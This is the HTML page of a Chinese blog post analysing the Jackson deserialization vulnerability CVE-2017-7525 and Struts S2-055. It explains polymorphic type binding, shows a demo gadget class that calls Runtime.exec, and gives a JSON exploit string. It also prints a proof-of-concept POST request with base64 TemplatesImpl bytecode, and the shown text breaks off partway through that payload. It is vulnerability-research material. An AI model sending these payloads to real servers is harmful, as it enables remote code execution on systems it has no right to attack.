<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Jackjson基础基本用法 就是将Java对象序列化与反序列化      1234567891011121314151617public static void main(String[] args) throws IOException &amp;#123;    User user = new User();    user.name = &amp;quot;Tom&amp;quot;;    user.age =">
<meta name="keywords" content="Java安全">
<meta property="og:type" content="article">
<meta property="og:title" content="Jackson反序列化CVE-2017-7525">
<meta property="og:url" content="http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="Jackjson基础基本用法 就是将Java对象序列化与反序列化      1234567891011121314151617public static void main(String[] args) throws IOException &amp;#123;    User user = new User();    user.name = &amp;quot;Tom&amp;quot;;    user.age =">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-18.17.26.57-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-18.19.38.01-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-21.22.27.09-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.20.33.36-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-22.09.22.54-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-22.09.24.51-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-20.20.57.09-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-20.20.59.52-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-20.20.48.42-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.00.30-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.03.26-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-20.21.20.24-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-20.21.23.04-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.12.52-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.14.56-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.16.40-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.21.43.45-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.19.31-image.png">
<meta property="og:updated_time" content="2019-05-23T14:29:29.691Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Jackson反序列化CVE-2017-7525">
<meta name="twitter:description" content="Jackjson基础基本用法 就是将Java对象序列化与反序列化      1234567891011121314151617public static void main(String[] args) throws IOException &amp;#123;    User user = new User();    user.name = &amp;quot;Tom&amp;quot;;    user.age =">
<meta name="twitter:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-18.17.26.57-image.png">
    
    
        
          
              <link rel="shortcut icon" href="../../../../images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="../../../../images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Jackson反序列化CVE-2017-7525</title>
    <!-- styles -->
    <link rel="stylesheet" href="../../../../css/style.css">
    <!-- rss -->
    
    
</head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="../../18/Jackson反序列化CVE-2017-17485/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="../../14/Fastjson反序列化之JdbcRowSetImpl/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">回到顶部</span>
      <span id="i-share" class="info" style="display:none;">分享</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&text=Jackson反序列化CVE-2017-7525"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&title=Jackson反序列化CVE-2017-7525"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&is_video=false&description=Jackson反序列化CVE-2017-7525"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Jackson反序列化CVE-2017-7525&body=Check out this article: http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&title=Jackson反序列化CVE-2017-7525"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&title=Jackson反序列化CVE-2017-7525"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&title=Jackson反序列化CVE-2017-7525"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&title=Jackson反序列化CVE-2017-7525"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&name=Jackson反序列化CVE-2017-7525&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jackjson基础"><span class="toc-number">1.</span> <span class="toc-text">Jackjson基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本用法"><span class="toc-number">1.1.</span> <span class="toc-text">基本用法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#为什么会在反序列化时执行代码"><span class="toc-number">2.</span> <span class="toc-text">为什么会在反序列化时执行代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jackson的多态类型绑定"><span class="toc-number">2.1.</span> <span class="toc-text">Jackson的多态类型绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#全局Default-Typing机制"><span class="toc-number">2.1.1.</span> <span class="toc-text">全局Default Typing机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用JsonTypeInfo注解"><span class="toc-number">2.1.2.</span> <span class="toc-text">使用JsonTypeInfo注解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">2.1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-7525-amp-amp-S2-055"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2017-7525 &amp;&amp; S2-055</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#条件"><span class="toc-number">3.1.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析"><span class="toc-number">3.1.2.</span> <span class="toc-text">分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御与检测"><span class="toc-number">4.</span> <span class="toc-text">防御与检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Jackson反序列化CVE-2017-7525
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">P0rZ9's blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-05-16T00:15:41.000Z" itemprop="datePublished">2019-05-16</time>
    </div>


      
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link" href="../../../../tags/Java安全/">Java安全</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="Jackjson基础"><a href="#Jackjson基础" class="headerlink" title="Jackjson基础"></a>Jackjson基础</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><blockquote>
<p>就是将Java对象序列化与反序列化    </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">    User user = new User();</span><br><span class="line">    user.name = &quot;Tom&quot;;</span><br><span class="line">    user.age = 18;</span><br><span class="line"></span><br><span class="line">	//基本对象</span><br><span class="line">	ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">	</span><br><span class="line">    //序列化</span><br><span class="line">    String json = mapper.writeValueAsString(user);</span><br><span class="line">    //&#123;&quot;name&quot;:&quot;Tom&quot;,&quot;age&quot;:18&#125;</span><br><span class="line"></span><br><span class="line">    //反序列化</span><br><span class="line">    User user1 = mapper.readValue(json,User.class);</span><br><span class="line">    System.out.println(user1);</span><br><span class="line">    //name:Tom age:18</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="为什么会在反序列化时执行代码"><a href="#为什么会在反序列化时执行代码" class="headerlink" title="为什么会在反序列化时执行代码"></a>为什么会在反序列化时执行代码</h2><blockquote>
<p>当Jackson开启某些配置时，会允许开发者在反序列化时指定要还原的类，过程中调用其构造方法setter方法或某些特殊的getter方法，当这些方法中存在一些危险操作时就造成了代码执行。我们先了解下这些配置            </p>
</blockquote>
<h3 id="Jackson的多态类型绑定"><a href="#Jackson的多态类型绑定" class="headerlink" title="Jackson的多态类型绑定"></a>Jackson的多态类型绑定</h3><blockquote>
<p>这里多态是指在反序列化时可以指定类型为对应类或其子类。而Jackson为了支持多态，提供了全局Default Typing机制与@JsonTypeInfo注解两种方式。<a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization" target="_blank" rel="noopener">文档</a></p>
</blockquote>
<h4 id="全局Default-Typing机制"><a href="#全局Default-Typing机制" class="headerlink" title="全局Default Typing机制"></a>全局Default Typing机制</h4><p>上例子测试:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">定义几个需要的类:			</span><br><span class="line">class User&#123;</span><br><span class="line">    public String name;</span><br><span class="line">    public int age;</span><br><span class="line">    public Object obj;</span><br><span class="line"></span><br><span class="line">    public String toString()&#123;</span><br><span class="line">        return &quot;name:&quot; + name + &quot; age:&quot; + age + &quot; obj:&quot; + obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Height&#123;</span><br><span class="line">    public int h = 100;</span><br><span class="line">&#125;</span><br><span class="line">class Haight&#123;</span><br><span class="line">    public int h = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>开始测试:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class JackJsonDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping(); //默认为OBJECT_AND_NON_CONCRETE</span><br><span class="line"></span><br><span class="line">        String json1 = &quot;&#123;\&quot;name\&quot;:\&quot;Tom\&quot;,\&quot;age\&quot;:22,\&quot;obj\&quot;:[\&quot;jackson.Haight\&quot;,&#123;\&quot;h\&quot;:100&#125;]&#125;&quot;;</span><br><span class="line">        String json2 = &quot;&#123;\&quot;name\&quot;:\&quot;Tom\&quot;,\&quot;age\&quot;:22,\&quot;obj\&quot;:[\&quot;jackson.Height\&quot;,&#123;\&quot;h\&quot;:100&#125;]&#125;&quot;;</span><br><span class="line"></span><br><span class="line">        User user1 = mapper.readValue(json1,User.class);</span><br><span class="line">        System.out.println(user1.toString());</span><br><span class="line">        User user2 = mapper.readValue(json2,User.class);</span><br><span class="line">        System.out.println(user2.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output:	</span><br><span class="line">name:Tom age:22 obj:jackson.Haight@100d6b1</span><br><span class="line">name:Tom age:22 obj:jackson.Height@fd02e5</span><br></pre></td></tr></table></figure></p>
<p>我们观察结果可以发现:<br>因为<code>Object</code>默认为所有类的父类，所以当jackson开启多态绑定且类中存在<code>Object</code>字段，就可以在反序列化时指定恶意类(<code>类中方法存在危险操作</code>)，导致命令执行。这个类就是我们所说的<code>Gadget</code>。<br>我们可以先尝试着自己写一个<code>Gadget</code>理解下，因为无参构造方法不会造成代码执行，所以重点放在有参构造方法及setter方法中                </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public class JackJsonDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();  //默认为OBJECT_AND_NON_CONCRETE</span><br><span class="line">        //mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line"></span><br><span class="line">        String paylaod = &quot;&#123;\&quot;name\&quot;:\&quot;Tom\&quot;,\&quot;age\&quot;:22,\&quot;obj\&quot;:[\&quot;jackson.Vul\&quot;,\&quot;calc\&quot;]&#125;&quot;;</span><br><span class="line">        User user2 = mapper.readValue(paylaod,User.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">class Vul&#123;</span><br><span class="line">    private String commond;</span><br><span class="line">    private String cmd;</span><br><span class="line">    </span><br><span class="line">    public Vul()&#123;</span><br><span class="line">        System.out.println(&quot;Vul()&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Vul(String cmd) throws IOException &#123;</span><br><span class="line">        System.out.println(&quot;Vul(cmd)&quot;);</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setCommond(String commond) throws IOException &#123;</span><br><span class="line">        this.commond = commond;</span><br><span class="line">        System.out.println(&quot;setCommond()&quot;);</span><br><span class="line">        Runtime.getRuntime().exec(commond);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-18.17.26.57-image.png" alt="2019-05-18.17.26.57-image.png"></p>
<p>成功执行调用<code>Vul</code>类的有参构造方法执行命令。在反序列化研究中，这个Vul就是<code>gadget</code>，但是开发者不会在代码中写这样一个类，不过在依赖库中，由于需要完成的业务功能复杂，在代码中就有可能出现这样的类。如安全研究人员发现的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>与<code>org.springframework.context.support.FileSystemXmlApplicationContext</code>。我们后面分析如何使用这两个Gadget来达到RCE。现在我们来看下另外一种多态类型绑定的方法</p>
<h4 id="使用JsonTypeInfo注解"><a href="#使用JsonTypeInfo注解" class="headerlink" title="使用JsonTypeInfo注解"></a>使用JsonTypeInfo注解</h4><blockquote>
<p>JsonTypeInfo有5个取值</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.COSTOM)</span><br></pre></td></tr></table></figure>
<p>我们使用上面的例子并逐个添加注释查看</p>
<p><strong>@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</strong><br>输出：<code>{&quot;name&quot;:&quot;Tom&quot;,&quot;age&quot;:22,&quot;obj&quot;:{&quot;h&quot;:100}}</code>    </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-18.19.38.01-image.png" alt="2019-05-18.19.38.01-image.png"></p>
<p>该注释是最普通处理，序列化后的字符串无类信息，是安全的，不可利用。            </p>
<p><strong>@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</strong><br>输出<code>{&quot;name&quot;:&quot;Tom&quot;,&quot;age&quot;:22,&quot;obj&quot;:{&quot;@class&quot;:&quot;jackson.Height&quot;,&quot;h&quot;:100}}</code></p>
<p>序列化后的字符串含有类信息，可以利用，exp:<code>{&quot;name&quot;:&quot;Tom&quot;,&quot;age&quot;:22,&quot;obj&quot;:[&quot;jackson.Vul&quot;,&quot;calc&quot;]}</code></p>
<p><strong>@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</strong><br>输出<code>{&quot;name&quot;:&quot;Tom&quot;,&quot;age&quot;:22,&quot;obj&quot;:{&quot;@c&quot;:&quot;jackson.Height&quot;,&quot;h&quot;:100}}</code></p>
<p>序列化后的字符串含有类信息，与上一步区别为使用<code>@c</code>代替<code>@class</code>,可以利用</p>
<p><strong>@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</strong><br>输出<code>{&quot;name&quot;:&quot;Tom&quot;,&quot;age&quot;:22,&quot;obj&quot;:{&quot;@type&quot;:&quot;Height&quot;,&quot;h&quot;:100}}</code><br>经测试，序列化后字符串并没有带包名，在反序列化时也是不可以利用的。                    </p>
<p><strong>@JsonTypeInfo(use = JsonTypeInfo.Id.COSTOM)</strong></p>
<blockquote>
<p>需要解析器才能使用，不可利用</p>
</blockquote>
<p>  如上，我们发现有类信息的是<code>CLASS</code>与<code>MINIMAL_CLASS</code>是不安全的，无论是否开启<code>enableDefaultTyping</code>,如果用到这两个注释修饰Object属性字段，攻击者都可以控制类型，达到任意代码执行</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote>
<p>当启用enableDefaultTyping()或者使用CLASS MINIMAL_CLASS注释时，存在风险</p>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Struts2.5.x REST插件存在远程代码执行，原因就是使用了低版本的Jackson，在进行反序列化时如无对数据进行过滤会导致远程代码执行。这里就以搭建的S2-055复现环境为例来研究</p>
<p>影响版本:<br>Struts 2.5 - Struts 2.5.14</p>
<p>相关链接:<a href="https://cwiki.apache.org/confluence/display/WW/S2-055" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-055</a></p>
<h3 id="CVE-2017-7525-amp-amp-S2-055"><a href="#CVE-2017-7525-amp-amp-S2-055" class="headerlink" title="CVE-2017-7525 &amp;&amp; S2-055"></a>CVE-2017-7525 &amp;&amp; S2-055</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><p>1.jackson version:<br>jackson 2.7 (&lt;2.7.10)<br>jackson 2.8 (&lt;2.8.9)</p>
<p>2.利用类(User)存在字段类型为<code>Interface、abstract class、Object</code>,且<code>Gadget</code>为其子类/实现接口</p>
<p>关于利用类(User)是否必须存在无参构造方法<br>答:如果利用类有有参构造方法，必须定义一个无参构造方法<br>如果无有参构造方法，有无无参构造方法都可以<br>(因为如果程序无有参构造方法，编译器会自动添加无参构造方法。但是如果定义了有参构造方法而未添加无参构造方法，编译器就不会默认添加无参构造方法)            </p>
<p>3.<br>开启JacksonPolymorphicDeserialization:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">启用enableDefaultTyping()</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br></pre></td></tr></table></figure></p>
<p>4.JDK&lt;1.7<br>在JDK1.8中,<code>defineTransletClasses()</code>会用到<code>_tfactory:{}</code>属性，原来的poc因为不含这字段会报错退出。<br>我们尝试在构造Json数据时，添加<code>_tfactory:{}</code>属性，发现在初始化<code>TemplatesImpl</code>时并不会去接收<code>_tfactory</code>参数</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-21.22.27.09-image.png" alt="2019-05-21.22.27.09-image.png"></p>
<p>情况与Fastjson(<code>_tfactory:{}</code>)不同</p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><blockquote>
<p>漏洞利用的是com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个<br>Gadget,Fastjson也用到过这个Gadget</p>
</blockquote>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /orders HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">DNT: 1</span><br><span class="line">Referer: http://localhost:8080/orders/new</span><br><span class="line">Cookie: JSESSIONID=D9DF110A1225986909A9F0FB9B5AA9E3</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 1795</span><br><span class="line"></span><br><span class="line">&#123;&quot;clientName&quot;:[&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&#123;&quot;transletBytecodes&quot;:[&quot;yv66vgAAADIAKQoABgAcCgAdAB4IAB8KAB0AIAcAIQcAIgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTEV4cGxvaXQxOwEACkV4Y2VwdGlvbnMHACMBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADUV4cGxvaXQxLmphdmEMAAcACAcAJAwAJQAmAQAEY2FsYwwAJwAoAQAIRXhwbG9pdDEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAEAAQABQANAAYACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAEACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAKAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIAAAABABYAFwADAAEAEAAYAAEACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFgAZAAIAA